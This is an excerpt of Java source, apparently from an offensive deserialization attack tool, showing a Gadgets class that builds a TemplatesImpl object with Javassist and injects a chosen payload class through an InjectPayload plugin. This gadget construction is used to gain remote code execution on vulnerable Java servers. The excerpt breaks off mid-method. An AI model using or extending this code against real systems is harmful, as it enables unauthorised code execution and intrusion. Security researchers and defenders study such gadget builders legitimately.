...
import com.summersec.attack.deser.plugins.InjectPayload;
...
public class Gadgets {
    ...
    public static Object createTemplatesImpl(String classpayload,String payloadskey) throws Exception {
        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(classpayload, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),payloadskey) : createTemplatesImpl(classpayload, TemplatesImpl.class, AbstractTranslet.class,payloadskey);
    }

    public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet,String payloadskey) throws Exception {
        T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz;
        if(payloadskey!=null && !payloadskey.equals("")){
            Class<? extends InjectPayload> echoClazz = com.summersec.attack.deser.plugins.InjectPayload.Utils.getPayloadClass(payload);
            InjectPayload<?> echoObj = (InjectPayload)echoClazz.newInstance();
            clazz = echoObj.genPayload(pool,payloadskey);
        }
        else{
